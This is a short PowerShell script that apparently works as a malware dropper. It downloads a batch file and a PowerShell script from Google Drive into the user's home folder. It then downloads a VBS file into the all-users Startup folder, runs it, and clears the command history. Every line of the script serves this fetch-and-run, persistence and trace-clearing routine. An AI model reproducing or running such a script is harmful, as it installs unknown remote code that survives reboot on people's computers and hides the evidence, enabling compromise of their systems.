cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1Orta5BLxyZm7BZ_6cpNaj3E5xCpTR-UL" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1KS6Rm71qi-hjGq2Tf-JxKLXEheAgIi_3" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1GLzGz7NNZ-U3yFdYKtZRcVOxlm30sWng" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit